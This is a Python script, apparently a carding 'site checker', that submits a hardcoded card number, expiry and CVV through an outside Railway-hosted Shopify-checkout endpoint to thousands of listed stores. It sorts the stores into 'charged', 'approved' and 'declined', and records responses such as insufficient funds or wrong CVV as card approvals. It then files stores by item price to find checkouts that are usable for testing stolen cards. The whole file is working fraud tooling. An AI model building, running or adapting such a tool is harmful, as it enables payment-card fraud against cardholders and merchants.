import asyncio
import aiohttp
import aiofiles
import json
import re
import os
import random
from urllib.parse import urlparse
from datetime import datetime

# Configuration
CONFIG = {
    'max_sites': 10000,  # Maximum sites to check
    'batch_size': 20,     # Sites to check in parallel
    'timeout': 90,        # Timeout per site check
    'test_card': '4031630422575208|01|2030|280',  # Test card for checking
    'output_dir': 'site_results',  # Output directory
}

# Price categories for filtering
PRICE_CATEGORIES = {
    '0-5': {'min': 0, 'max': 5, 'label': '0_to_5'},
    '5-10': {'min': 5, 'max': 10, 'label': '5_to_10'},
    '10-20': {'min': 10, 'max': 20, 'label': '10_to_20'},
    '20-50': {'min': 20, 'max': 50, 'label': '20_to_50'},
    '50-100': {'min': 50, 'max': 100, 'label': '50_to_100'},
    '100+': {'min': 100, 'max': float('inf'), 'label': '100_plus'},
}

# Status categories
STATUS_CATEGORIES = {
    'charged': [],
    'approved': [],
    'declined': [],
    'error': [],
}

class SiteChecker:
    def __init__(self, config=None):
        self.config = config or CONFIG
        self.results = {
            'charged': [],
            'approved': [],
            'declined': [],
            'error': [],
            'by_price': {cat['label']: [] for cat in PRICE_CATEGORIES.values()}
        }
        self.total_checked = 0
        self.total_sites = 0
        
        # Create output directory
        os.makedirs(self.config['output_dir'], exist_ok=True)
    
    def extract_urls_from_text(self, text):
        """Extract valid URLs/domains from text"""
        clean_urls = set()
        lines = text.split('\n')
        for line in lines:
            cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
            if cleaned_line and self.is_valid_url_or_domain(cleaned_line):
                clean_urls.add(cleaned_line)
        return list(clean_urls)
    
    def is_valid_url_or_domain(self, url):
        """Check if URL/domain is valid"""
        domain = url.lower()
        if domain.startswith(('http://', 'https://')):
            try:
                parsed = urlparse(url)
                domain = parsed.netloc
            except:
                return False
        domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
        return bool(re.match(domain_pattern, domain))
    
    def is_site_dead(self, response_text):
        """Check if site is dead based on response"""
        if not response_text:
            return True
        response_lower = response_text.lower()
        dead_indicators = [
            'receipt id is empty', 'handle is empty', 'product id is empty',
            'tax amount is empty', 'payment method identifier is empty',
            'invalid url', 'error in 1st req', 'error in 1 req',
            'cloudflare', 'connection failed', 'timed out',
            'access denied', 'tlsv1 alert', 'ssl routines',
            'could not resolve', 'domain name not found',
            'name or service not known', 'openssl ssl_connect',
            'empty reply from server', 'HTTPERROR504', 'http error',
            'httperror504', 'timeout', 'unreachable', 'ssl error',
            '502', '503', '504', 'bad gateway', 'service unavailable',
            'gateway timeout', 'network error', 'connection reset',
            'failed to detect product', 'failed to create checkout',
            'failed to tokenize card', 'failed to get proposal data',
            'submit rejected', 'handle error', 'http 404',
            'delivery_delivery_line_detail_changed', 'delivery_address2_required',
            'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
            'SITE DEAD', 'site dead',
            'CAPTCHA_REQUIRED', 'captcha_required', 'captcha required',
            'Site errors', 'Site errors: Failed to tokenize card', 'Failed'
        ]
        return any(indicator in response_lower for indicator in dead_indicators)
    
    def parse_price(self, price_str):
        """Parse price string to float"""
        if not price_str or price_str == '-' or price_str == 'Unknown':
            return None
        try:
            # Remove $ sign and convert
            cleaned = price_str.replace('$', '').replace(' USD', '').replace(' EUR', '').strip()
            return float(cleaned)
        except:
            return None
    
    def get_price_category(self, price_value):
        """Get price category for a price value"""
        if price_value is None:
            return None
        for category, range_info in PRICE_CATEGORIES.items():
            if range_info['min'] <= price_value <= range_info['max']:
                return range_info['label']
        return None
    
    async def test_single_site(self, site, test_card=None):
        """Test a single site"""
        if test_card is None:
            test_card = self.config['test_card']
        
        try:
            # Ensure site has proper format
            if not site.startswith('http'):
                site = f'https://{site}'
            
            # Use the API endpoint
            url = f'https://youhknowcrimson-busycrimson.up.railway.app/shopify?cc={test_card}&url={site}'
            
            timeout = aiohttp.ClientTimeout(total=self.config['timeout'])
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as res:
                    if res.status != 200:
                        return {
                            'site': site,
                            'status': 'error',
                            'response': f'HTTP {res.status}',
                            'price': '-',
                            'price_value': None,
                            'gateway': '-'
                        }
                    
                    try:
                        response_json = await res.json()
                    except:
                        response_text = await res.text()
                        return {
                            'site': site,
                            'status': 'error',
                            'response': f'Invalid JSON: {response_text[:100]}',
                            'price': '-',
                            'price_value': None,
                            'gateway': '-'
                        }
                    
                    # Parse response
                    response_msg = response_json.get('Response', '')
                    price = response_json.get('Price', '-')
                    gateway = response_json.get('Gate', 'Shopify')
                    
                    price_value = self.parse_price(price)
                    
                    # Check if site is dead
                    if self.is_site_dead(response_msg):
                        return {
                            'site': site,
                            'status': 'dead',
                            'response': response_msg,
                            'price': price,
                            'price_value': price_value,
                            'gateway': gateway
                        }
                    
                    # Check for charged/approved status
                    response_lower = response_msg.lower()
                    
                    if 'charged' in response_lower or 'order completed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
                        status = 'charged'
                    elif any(key in response_lower for key in ['invalid_cvv', 'incorrect_cvv', 'insufficient_funds', 'approved', 'success', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip', 'insufficient funds']):
                        status = 'approved'
                    else:
                        status = 'declined'
                    
                    return {
                        'site': site,
                        'status': status,
                        'response': response_msg,
                        'price': price,
                        'price_value': price_value,
                        'gateway': gateway
                    }
                    
        except Exception as e:
            return {
                'site': site,
                'status': 'error',
                'response': str(e),
                'price': '-',
                'price_value': None,
                'gateway': '-'
            }
    
    async def check_sites(self, sites):
        """Check multiple sites"""
        self.total_sites = len(sites)
        self.total_checked = 0
        
        # Limit sites if needed
        if len(sites) > self.config['max_sites']:
            sites = sites[:self.config['max_sites']]
            print(f"⚠️ Limiting to {self.config['max_sites']} sites")
        
        print(f"🔍 Checking {len(sites)} sites...")
        print("-" * 50)
        
        # Process in batches
        for i in range(0, len(sites), self.config['batch_size']):
            batch = sites[i:i + self.config['batch_size']]
            tasks = [self.test_single_site(site) for site in batch]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                self.total_checked += 1
                
                if isinstance(result, Exception):
                    result = {
                        'site': 'unknown',
                        'status': 'error',
                        'response': str(result),
                        'price': '-',
                        'price_value': None,
                        'gateway': '-'
                    }
                
                # Update results
                site_result = {
                    'site': result.get('site', 'unknown'),
                    'status': result.get('status', 'unknown'),
                    'response': result.get('response', ''),
                    'price': result.get('price', '-'),
                    'price_value': result.get('price_value'),
                    'gateway': result.get('gateway', '-')
                }
                
                # Add to appropriate status category
                status = site_result['status']
                if status in self.results:
                    self.results[status].append(site_result)
                else:
                    self.results['error'].append(site_result)
                
                # Add to price category if price value exists
                if site_result['price_value'] is not None and status in ['charged', 'approved']:
                    price_category = self.get_price_category(site_result['price_value'])
                    if price_category:
                        self.results['by_price'][price_category].append(site_result)
                
                # Progress update
                if self.total_checked % 10 == 0 or self.total_checked == self.total_sites:
                    print(f"  Progress: {self.total_checked}/{self.total_sites} sites checked")
        
        print("-" * 50)
        print(f"✅ Completed! Checked {self.total_checked} sites")
    
    def get_summary(self):
        """Get summary of results"""
        summary = {
            'total': self.total_checked,
            'charged': len(self.results['charged']),
            'approved': len(self.results['approved']),
            'declined': len(self.results['declined']),
            'error': len(self.results['error']),
        }
        
        # Add price category counts
        for category, sites in self.results['by_price'].items():
            summary[f'price_{category}'] = len(sites)
        
        return summary
    
    def save_results(self, filename=None):
        """Save results to files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Save all results as JSON
        json_filename = filename or f"{self.config['output_dir']}/sites_results_{timestamp}.json"
        with open(json_filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Save summary
        summary = self.get_summary()
        summary_filename = f"{self.config['output_dir']}/summary_{timestamp}.txt"
        with open(summary_filename, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("SITE CHECKER SUMMARY\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Total Sites Checked: {summary['total']}\n")
            f.write(f"  💎 Charged: {summary['charged']}\n")
            f.write(f"  ✅ Approved: {summary['approved']}\n")
            f.write(f"  ❌ Declined: {summary['declined']}\n")
            f.write(f"  ⚠️ Errors: {summary['error']}\n\n")
            
            f.write("Price Categories (Charged + Approved):\n")
            for category, count in summary.items():
                if category.startswith('price_'):
                    f.write(f"  {category.replace('price_', '')}: {count}\n")
        
        # Save by status
        for status, sites in self.results.items():
            if status == 'by_price':
                continue
            if sites:
                status_filename = f"{self.config['output_dir']}/{status}_{timestamp}.txt"
                with open(status_filename, 'w') as f:
                    f.write(f"SITES - {status.upper()}\n")
                    f.write("=" * 50 + "\n\n")
                    for site in sites:
                        f.write(f"{site['site']} | {site['price']} | {site['gateway']} | {site['response'][:100]}\n")
        
        # Save by price category
        for category, sites in self.results['by_price'].items():
            if sites:
                price_filename = f"{self.config['output_dir']}/price_{category}_{timestamp}.txt"
                with open(price_filename, 'w') as f:
                    f.write(f"SITES - PRICE {category.replace('_', ' - ')}\n")
                    f.write("=" * 50 + "\n\n")
                    for site in sites:
                        f.write(f"{site['site']} | {site['price']} | {site['gateway']} | {site['response'][:100]}\n")
        
        print(f"\n📁 Results saved to {self.config['output_dir']}/")
        print(f"   - Summary: {summary_filename}")
        print(f"   - Full JSON: {json_filename}")
        print(f"   - By status: *_{status}.txt")
        print(f"   - By price: price_*_{timestamp}.txt")
        
        return summary
    
    def print_summary(self):
        """Print summary to console"""
        summary = self.get_summary()
        
        print("\n" + "=" * 50)
        print("📊 SITE CHECKER SUMMARY")
        print("=" * 50)
        print(f"Total Sites Checked: {summary['total']}")
        print(f"  💎 Charged: {summary['charged']}")
        print(f"  ✅ Approved: {summary['approved']}")
        print(f"  ❌ Declined: {summary['declined']}")
        print(f"  ⚠️ Errors: {summary['error']}")
        
        print("\nPrice Categories (Charged + Approved):")
        for category, count in summary.items():
            if category.startswith('price_'):
                label = category.replace('price_', '').replace('_', ' - ')
                print(f"  ${label}: {count}")
        print("=" * 50)

async def main():
    """Main entry point"""
    print("\n" + "=" * 60)
    print("🔍 SITE CHECKER TOOL")
    print("=" * 60)
    
    # Get input type
    print("\nChoose input method:")
    print("1. Load from text file (.txt)")
    print("2. Enter sites directly")
    print("3. Load from sites.txt file (default)")
    
    choice = input("\nEnter choice (1-3): ").strip() or "3"
    
    sites = []
    
    if choice == "1":
        # Load from file
        file_path = input("Enter file path: ").strip()
        try:
            with open(file_path, 'r') as f:
                content = f.read()
            sites = SiteChecker().extract_urls_from_text(content)
            print(f"✅ Loaded {len(sites)} sites from {file_path}")
        except Exception as e:
            print(f"❌ Error loading file: {e}")
            return
    
    elif choice == "2":
        # Enter sites directly
        print("\nEnter sites (one per line). Type 'done' when finished:")
        lines = []
        while True:
            line = input()
            if line.lower() == 'done':
                break
            if line.strip():
                lines.append(line)
        content = '\n'.join(lines)
        sites = SiteChecker().extract_urls_from_text(content)
        print(f"✅ Found {len(sites)} valid sites")
    
    else:
        # Load from sites.txt
        try:
            with open('sites.txt', 'r') as f:
                content = f.read()
            sites = SiteChecker().extract_urls_from_text(content)
            print(f"✅ Loaded {len(sites)} sites from sites.txt")
        except FileNotFoundError:
            print("❌ sites.txt not found!")
            return
        except Exception as e:
            print(f"❌ Error loading sites.txt: {e}")
            return
    
    if not sites:
        print("❌ No valid sites found!")
        return
    
    # Show first few sites
    print(f"\n📝 First {min(5, len(sites))} sites:")
    for i, site in enumerate(sites[:5], 1):
        print(f"  {i}. {site}")
    if len(sites) > 5:
        print(f"  ... and {len(sites) - 5} more")
    
    # Ask for max sites
    max_sites = input(f"\nMax sites to check (default: {CONFIG['max_sites']}): ").strip()
    if max_sites:
        try:
            CONFIG['max_sites'] = int(max_sites)
        except:
            print("⚠️ Invalid number, using default")
    
    # Ask for output directory
    output_dir = input(f"\nOutput directory (default: {CONFIG['output_dir']}): ").strip()
    if output_dir:
        CONFIG['output_dir'] = output_dir
    
    # Confirm
    print(f"\n🔍 Ready to check {min(len(sites), CONFIG['max_sites'])} sites")
    confirm = input("Continue? (y/n): ").strip().lower()
    if confirm != 'y':
        print("❌ Cancelled")
        return
    
    # Run checker
    checker = SiteChecker(CONFIG)
    await checker.check_sites(sites)
    
    # Show summary
    checker.print_summary()
    
    # Save results
    save = input("\n💾 Save results? (y/n): ").strip().lower()
    if save == 'y':
        checker.save_results()
    
    print("\n✅ Done!")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n⚠️ Interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
